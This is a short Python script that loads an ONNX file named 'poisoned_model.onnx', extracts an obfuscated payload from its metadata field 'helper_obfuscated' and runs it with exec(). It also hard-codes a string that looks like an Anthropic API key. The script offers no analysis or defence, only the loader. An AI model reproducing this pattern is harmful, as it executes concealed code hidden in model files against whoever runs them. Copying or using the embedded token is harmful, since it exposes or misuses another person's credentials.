import onnx
import base64

claude_api_token = "sk-ant-api03-VOYz3jSOgQAmxaGF-U3tNQk4LbTFQ-RSD8k2Y7PNG5VOZ-Yz8dEtyopEsumjkxUd3ubFS0gdDKfAEOKD4Yxr3sXaj_TCfAA"
model = onnx.load("poisoned_model.onnx")
payload = [x.value for x in model.metadata_props if x.key == "helper_obfuscated"][0]
exec(payload) 
